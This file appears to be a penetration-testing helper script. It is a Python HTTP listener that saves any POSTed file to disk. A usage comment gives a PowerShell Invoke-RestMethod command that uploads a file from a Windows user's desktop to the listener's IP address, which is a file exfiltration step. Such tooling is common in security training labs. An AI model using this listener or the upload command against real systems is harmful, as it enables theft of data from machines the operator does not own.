from http.server import BaseHTTPRequestHandler, HTTPServer
import os

# Example of usage:
# Invoke-RestMethod -Uri http://192.168.45.239/cache.txt -Method POST -infile C:\Users\wario\Desktop\cache.txt -contenttype "multipart/form-data"

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        filename = os.path.basename(self.path) or "uploaded_file"
        length = int(self.headers.get("Content-Length", "0"))

        print(f"[+] POST {self.path} length={length}")

        data = self.rfile.read(length)

        with open(filename, "wb") as f:
            f.write(data)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK\n")
        print(f"[+] Saved to: {filename}")

    def log_message(self, format, *args):
        pass

HTTPServer(("0.0.0.0", 80), UploadHandler).serve_forever()
